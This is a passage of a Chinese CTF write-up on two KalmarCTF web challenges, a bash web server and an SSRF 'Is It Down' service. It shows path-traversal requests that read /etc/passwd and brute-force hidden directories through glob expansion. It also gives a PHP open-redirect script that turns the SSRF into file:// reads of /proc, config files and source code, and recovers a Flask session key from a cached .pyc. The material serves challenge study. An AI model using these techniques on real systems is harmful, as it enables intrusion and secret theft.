+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ubuntu/Desktop# url=$(ls)</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# path=&quot;app/static/$url&quot;</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# cat &quot;$path&quot;</span><br><span class="line">cat: &#x27;app/static/1.sh&#x27;$&#x27;\n&#x27;&#x27;2&#x27;: 没有那个文件或目录</span><br></pre></td></tr></table></figure>
+
+<p>实际结果</p>
+<p><img src="/posts/fbcd83ad/image-20240324193741286.png" alt="image-20240324193741286"></p>
+<details class="tag-plugin colorful folding" ><summary><p>open , 拓展：shell语言中的部分特性</p>
+</summary><div class="body"><p><strong>特性4：read命令处理字符串</strong></p> <p>使用read命令来读取输入的字符串时，所读取的字符串相当于被单引号包围，具有单引号包裹的字符串的特点</p> <ul> <li><strong>变量不展开</strong>：单引号内的内容都会被当作普通字符串处理，包括变量，它们不会被展开。</li> <li><strong>命令不替换</strong>：单引号内的命令不会被执行，即使使用<code>$()</code>或反引号&#96;&#96;。</li> <li><strong>通配符不展开</strong>：单引号内的通配符同样不会被展开，被视为普通文本。</li> <li><strong>转义字符不工作</strong>：单引号内几乎所有的字符都被视为普通字符，包括反斜线（<code>\</code>），它不具有转义功能。</li> </ul> <p>例如：</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">test1</span></span><br><span class="line">read -d $&#x27;\n&#x27; -a request_line</span><br><span class="line">method=$&#123;request_line[0]&#125;</span><br><span class="line">echo $method</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输入：$(<span class="built_in">ls</span>) $(<span class="built_in">ls</span>) $(<span class="built_in">ls</span>)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输出：$(<span class="built_in">ls</span>)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">test2</span></span><br><span class="line">request_line=(&quot;$(ls)&quot; &quot;$(ls)&quot;)</span><br><span class="line">method=$&#123;request_line[0]&#125;</span><br><span class="line">echo $method</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输出：badass_server.sh bash.md</span></span><br></pre></td></tr></table></figure> </div></details>
+
+<p>此时发现我们可控点只剩下<code>$protocol</code>变量</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protocol=$(echo -n &quot;$&#123;request_line[2]&#125;&quot; | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;) </span><br><span class="line">if [ $protocol != &#x27;HTTP/1.0&#x27; ] &amp;&amp; [ $protocol != &#x27;HTTP/1.1&#x27; ]; then</span><br><span class="line">	abort &#x27;Invalid protocol&#x27;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<h4 id="逻辑漏洞2："><a href="#逻辑漏洞2：" class="headerlink" title="逻辑漏洞2："></a>逻辑漏洞2：</h4><p><strong>可控原因</strong>：<code>$protocol</code><strong>变量由于使用</strong><code>echo</code><strong>命令，是得read读取后的特性消失，使得</strong><code>$protocol</code><strong>可被拓展</strong></p>
+<p>当我们尝试修改<code>HTTP/1.1</code>为<code>/*</code>时，发现并没有出现<code>Invalid protocol</code></p>
+<details class="tag-plugin colorful folding" ><summary><p>open , 拓展：shell语言中的部分特性</p>
+</summary><div class="body"><p><strong>特性4：[]的返回值</strong></p> <p>在 shell 中，<code>[]</code> 符号通常用于条件测试。如 <code>if [ CONDITION ]; then ...</code> 这样的语句。在这种用法中，<code>[]</code> 是 <code>[</code> 命令的简写，这实际上是一个指向 <code>test</code> 命令的链接。因此，当你使用 <code>[]</code> 时，实际上是在调用 <code>test</code> 命令来评估一个条件。</p> <p><code>test</code> 命令（或其等价的 <code>[</code> 形式）的返回值遵循 shell 命令的通用返回值约定：</p> <ul> <li><strong>0</strong>：表示测试的条件为<strong>真（true）</strong>。</li> <li><strong>1</strong>：表示测试的条件为<strong>假（false）</strong>。。</li> <li><strong>&gt;1</strong>：如果出现错误，如语法错误或使用了无效的选项，<code>test</code> 命令可能会返回大于 1 的值。比较特别的是，此时即使设置了<code>set -e</code>也不会退出程序</li> </ul> </div></details>
+
+<h4 id="逻辑漏洞3："><a href="#逻辑漏洞3：" class="headerlink" title="逻辑漏洞3："></a>逻辑漏洞3：</h4><p>将<code>HTTP/1.1</code>替换为<code>/*</code>时，由于通配符展开，最后会出现进行匹配错误，<code>[]</code>返回大于1的结果，<code>&amp;&amp;</code>的两侧结果都是大于0，返回1，因此<strong>认为是假</strong>，此时这个<code>if</code>条件被判定为假，可以继续执行后面内容的代码</p>
+<p>但如果<code>/*</code>匹配到的结果只有一个时，并不会造成匹配错误，而直接返回0，<code>&amp;&amp;</code>的任意一侧结果为0会直接返回0，此时这个<code>if</code>条件被<strong>判定为真</strong></p>
+<p>启动<code>set -x</code>时的详细信息如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ &#x27;[&#x27; badass_server.sh bash.md character1.sh character2.sh file &#x27;!=&#x27; HTTP/1.0 &#x27;]&#x27;</span><br><span class="line">./badass_server.sh: line 63: [: too many arguments</span><br></pre></td></tr></table></figure>
+
+<p><em>注意：<strong>此时通配符展开并不能认为这个变量是数组</strong>，数组直接使用会利用数组第0个进行匹配，而通配符展开会报错</em></p>
+<p>因此我们可以通过这个点，使用<code>glob</code>通配符<code>[]</code>写入一个已知的字符，不断修改字符，使其最后能匹配到的结果最后有1个以上，页面不出现：<code>Invalid protocol</code>，进行对目录或者文件名的<strong>一步一步匹配</strong>（用这种方法可以确定名称比已知目录少的目录名）</p>
+<p>最初的页面给出了两个目录，需要利用这两个目录，选择一个目录作为已知字符</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;assets/26c3f25922f71af3372ac65a75cd3b11/iceberg.jpg&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span>&gt;</span>Explore the iceberg<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;a href=&quot;assets/f200d055a267ae56160198e0fcb47e5f/try_harder.txt&quot;&gt;</span></span><br><span class="line"><span class="comment">	&lt;button&gt;Get the flag&lt;/button&gt;</span></span><br><span class="line"><span class="comment">&lt;/a&gt; --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>以<code>26c3f25922f71af3372ac65a75cd3b11</code>作为已知字符为例，所以最后的playload的过程为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /../../../../../../etc/passwd /app/static/assets/[29]*</span><br><span class="line">GET /../../../../../../etc/passwd /app/static/assets/[29][6d]*</span><br><span class="line">GET /../../../../../../etc/passwd /app/static/assets/[29][6d][cf]*</span><br><span class="line">........</span><br></pre></td></tr></table></figure>
+
+<p>最后找到隐藏的目录， <code>9df5256fe48859c91122cb92964dbd66</code> </p>
+<p>估计最后是猜的吧，flag最后的位置是：<code>/app/static/assets/9df5256fe48859c91122cb92964dbd66/flag.txt</code></p>
+<p>修改url为<code>../../../../../app/static/assets/9df5256fe48859c91122cb92964dbd66/flag.txt</code>读出<code>kalmar&#123;17b29adf_bash_web_server_was_a_mistake_374add33&#125;</code></p>
+<h2 id="Is-It-Down"><a href="#Is-It-Down" class="headerlink" title="Is It Down"></a>Is It Down</h2><p><em><strong>它是否宕机</strong></em></p>
+<h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
+<p>In an increasingly online world it is nice to know, if you are the only one being offline or if everybody else are having offline too.</p>
+<p><em>在一个日益在线化的世界中，了解自己是唯一离线还是其他人也处于离线状态是很重要的。</em></p>
+<p>We present to you: Is it down!</p>
+<p><em>我们向您介绍：它是否宕机！</em></p>
+<p>Rumour has it, that a flag is stored somewhere on this server.</p>
+<p><em>有传言称，一个标志位被存储在这台服务器的某个地方。</em></p>
+</blockquote>
+<h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><ul>
+<li><code>/proc</code>目录以及子目录的功能及其作用</li>
+<li>Python语言及特性</li>
+<li><code>__pycache__</code>文件夹</li>
+</ul>
+<h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>同样的这也是一个<strong>黑盒测试</strong>，看了看页面发现并没有什么提示，可以根据自己的输入的网址进行判断，网址是否在线或者离线</p>
+<p><img src="/posts/fbcd83ad/image-20240324232149397.png" alt="image-20240324232149397"></p>
+<p>直接抓包然后repeat看看</p>
+<p><img src="/posts/fbcd83ad/image-20240324223950122.png" alt="image-20240324223950122"></p>
+<p>会发现页面出现了我们输入网页的源代码，<strong>相关的漏洞应该就是SSRF</strong></p>
+<p>尝试直接使用<code>file:///etc/passwd</code>试试看，发现页面回显出了</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;error&quot;</span><span class="punctuation">:</span><span class="string">&quot;Url must start with &#x27;https://&#x27;. We do not want anything insecure here!&quot;</span><span class="punctuation">,</span><span class="attr">&quot;success&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现只能使用<code>https://</code>开头的链接（<del>是我应该就在这卡住了</del>）</p>
+<p>根据大佬的思路，我们可以尝试一个发生重定向的网址，  <del>无语啦 。。。。。。。。好麻烦，还得自己起个https服务</del></p>
+<p><strong>根据实际的测试发现</strong>：</p>
+<ul>
+<li>如果输入的链接网页存在任何内容，不会跟随着网页重定向</li>
+<li>如果输入的链接网页不存在任何内容，此时会跟随着网页重定向</li>
+</ul>
+<p>例如：</p>
+<p>我们输入网址的响应包为：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Mar 2024 15:00:50 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>162</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>https://t.doruo.cn/14Qqfhjr2</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>nginx<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>此时，不跟随重定向，返回的内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;content&quot;:&quot;&lt;html&gt;\\r\\n&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;\\r\\n&lt;body bgcolor=\&quot;white\&quot;&gt;\\r\\n&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;\\r\\n&lt;hr&gt;&lt;center&gt;openresty&lt;/center&gt;\\r\\n&lt;/body&gt;\\r\\n&lt;/html&gt;\\r\\n&quot;,&quot;online&quot;:true,&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>我们自己起一个后端服务</strong>，为了随时更改重定向内容，我们可以设置代码为以下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;wells&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>此时我们使用这个服务，并输入参数<code>?wells=file:///etc/passwd</code>,发现页面返回出来了<code>passwd</code>的文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;content&quot;:&quot;root:x:0:0:root:/root:/bin/ash\\n.........&quot;,&quot;online&quot;:true,&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时再次利用<code>/proc</code>目录进行尝试找到后端服务的文件夹位置以及所对应的运行程序</p>
+<p>在<code>/proc/1/cmdline</code>尝试读取后端的运行程序的相关信息<code>uwsgi\\x00--ini\\x00/etc/uwsgi/uwsgi-custom.ini\\x00</code>，可以猜到此时的后端应该是<code>flask</code>，然后再顺藤摸瓜进入到<code>/etc/uwsgi/uwsgi-custom.ini</code>读取配置信息：（美化后）</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[uwsgi]</span></span><br><span class="line"><span class="attr">uid</span> = www-data</span><br><span class="line"><span class="attr">gid</span> = www-data</span><br><span class="line"><span class="attr">master</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">processes</span> = <span class="number">4</span></span><br><span class="line"><span class="attr">http-socket</span> = <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">5000</span></span><br><span class="line"><span class="attr">chmod-sock</span> = <span class="number">664</span></span><br><span class="line"><span class="attr">vacuum</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">die-on-term</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">wsgi-file</span> = /var/www/keep-dreaming-sonny-boy/app.py</span><br><span class="line"><span class="attr">callable</span> = app</span><br><span class="line"><span class="attr">pythonpath</span> = /usr/local/lib/python3.<span class="number">11</span>/site-packages</span><br></pre></td></tr></table></figure>
+
+<p>比较重要的信息是：<code>wsgi-file = /var/www/keep-dreaming-sonny-boy/app.py</code>，然后继续顺藤摸瓜找到对应的后端文件读出出来，因为经过了json的转化，变得无敌难看，让狗屁通美化一下最后得到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_from_directory, session, abort</span><br><span class="line"><span class="keyword">from</span> requestlib <span class="keyword">import</span> fetch</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> session_encryption_key</span><br><span class="line"><span class="keyword">import</span> subprocess, os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">protect_secrets</span>():</span><br><span class="line">    os.unlink(<span class="string">&quot;config.py&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(url, <span class="built_in">str</span>) <span class="keyword">or</span> <span class="built_in">len</span>(url) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;Please provide a regular url!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;https://&quot;</span>) <span class="keyword">or</span> url.lstrip() != url:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;Url must start with &#x27;https://&#x27;. We do not want anything insecure here!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__, static_folder=<span class="string">&#x27;static&#x27;</span>, static_url_path=<span class="string">&#x27;/assets/&#x27;</span>)</span><br><span class="line">app.secret_key = session_encryption_key</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Using key: &quot;</span>, app.secret_key)</span><br><span class="line"></span><br><span class="line">protect_secrets()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;pages&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">healthcheck</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;admin&quot;</span>) == <span class="literal">True</span>: <span class="comment">#</span></span><br><span class="line">        <span class="keyword">return</span> subprocess.check_output(<span class="string">&quot;/readflag&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/check&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    url = request.form.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    valid, err = check_url(url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span>: err</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">        content = fetch(url)</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&#x27;online&#x27;</span>: content != <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&#x27;content&#x27;</span>: content</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">10600</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但是这里面<code>requestlib</code>库文件是我们安装不了的，尝试直接读取一下<code>requestlib.py</code>查看是不是自己写的库，同样的也是读到了这个文件，经过美化后如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen, HTTPErrorProcessor, build_opener, Request</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NoRedirection</span>(<span class="title class_ inherited__">HTTPErrorProcessor</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">http_response</span>(<span class="params">self, request, response</span>):</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    https_response = http_response</span><br><span class="line"></span><br><span class="line">install_opener(build_opener(NoRedirection()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch</span>(<span class="params">url, follow_redirects=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Avoid endless redirect loops</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;requestlib 2.9-alpha&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    req = Request(url, headers=headers)</span><br><span class="line">    <span class="keyword">with</span> urlopen(req) <span class="keyword">as</span> res:</span><br><span class="line">        redirect_url = res.headers.get(<span class="string">&quot;Location&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> redirect_url <span class="keyword">and</span> follow_redirects:</span><br><span class="line">            <span class="keyword">return</span> fetch(redirect_url, follow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(res.read())[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>在定义的<code>fetch</code>函数中<code>follow_redirects</code>值默认为<code>True</code>，并且跟随响应包中的<code>Location</code>键值进行判断是否存在重定向，重定向的目标是何。但由于只限制了第一次输入的网址为<code>https://</code>,并<strong>未进行对重定向的协议进行检查</strong>从而造成了<code>SSRF</code></p>
+<details class="tag-plugin colorful folding" ><summary><p>如何处理重定向</p>
+</summary><div class="body"><p><strong>注意：</strong></p> <p>如浏览器，powershell中的curl再处理重定向时，无法处理从<code>https://</code>重定向至<code>file://</code></p> <p>powershell中的curl发生报错</p> <p><img src="/3f38953983e9ec433be5d50aee943d1f.png" alt="3f38953983e9ec433be5d50aee943d1f"></p> <p>浏览器会提示页面错误</p> <p><img src="/4fb256abd0148e6f540cc518868c64bb.png" alt="4fb256abd0148e6f540cc518868c64bb"></p> </div></details>
+
+<p>做到这里，<strong>关键其实是为造出一个session</strong>，其键值存在<code>admin: True</code>,但存有<code>session_encryption_key</code>的<code>config.py</code>再被调用后就被删除了,需要找到如何复原的办法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def healthcheck():</span><br><span class="line">    if session.get(&quot;admin&quot;) == True: #</span><br><span class="line">        return subprocess.check_output(&quot;/readflag&quot;)</span><br><span class="line">    else:</span><br><span class="line">        return abort(403)</span><br></pre></td></tr></table></figure>
+
+<h4 id="pycache-文件夹"><a href="#pycache-文件夹" class="headerlink" title="__pycache__文件夹"></a><code>__pycache__</code>文件夹</h4><blockquote>
+<p>在Python工作目录下，如果执行某文件后经常会自动生成一个<code>__pycache__</code>文件夹。<code>__pycache__</code>文件夹正是缓存*<code>.pyc</code>地方。<code>*.pyc</code>文件的命名格式是<code>&lt;module&gt;.&lt;interpreter_version&gt;.pyc</code>。<strong>注意，对于被导入（<code>import</code>）的module才会生成对应的<code>*.pyc</code>文件</strong></p>
+<p>详细文档可参考：</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/476772186">【Python】__pycache__文件夹是什么东西？ - 知乎 (zhihu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yitiaodashu/article/details/79023987">pyhton中__pycache__文件夹的产生与作用_pycache文件夹下的东西是如何产生的-CSDN博客</a></p>
+<p>例子：</p>
+<p>以被导入的为<code>config.py</code>文件为例，最后生成在<code>__pycache__</code>文件夹<code>config.cpython-35.pyc</code>，最开始的<code>config</code>为被导入的文件名，<code>cpython</code>代表的是c语言实现的Python解释器，<code>-35</code>代表的是版本为3.5版。</p>
+</blockquote>
+<p>因此，我们可以在<code>__pycache__</code>文件夹中找到config的<code>.pyc</code>文件，再进行逆向</p>
+<p>最后测试到路径为：<code>/var/www/keep-dreaming-sonny-boy/__pycache__/config.cpython-311.pyc</code>，里面的内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\xa7\\r\\r\\n\\x00\\x00\\x00\\x00\\x86\\x84\\xf7e;\\x00\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\n\\x00\\x00\\x00\\x97\\x00d\\x00Z\\x00d\\x01S\\x00)\\x02\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\x01\\xda\\x16session_encryption_key\\xa9\\x00\\xf3\\x00\\x00\\x00\\x00\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\xfa\\x08&lt;module&gt;r\\x07\\x00\\x00\\x00\\x01\\x00\\x00\\x00s\\x11\\x00\\x00\\x00\\xf0\\x03\\x01\\x01\\x01\\xd8\\x19;\\xd0\\x00\\x16\\xd0\\x00\\x16\\xd0\\x00\\x16r\\x05\\x00\\x00\\x00</span><br></pre></td></tr></table></figure>
+
+<p>由于转化为json后转义字符<code>\</code>会变成<code>\\</code>,叫狗屁通写一个小小的脚本把以上数据恢复成二进制数据</p>
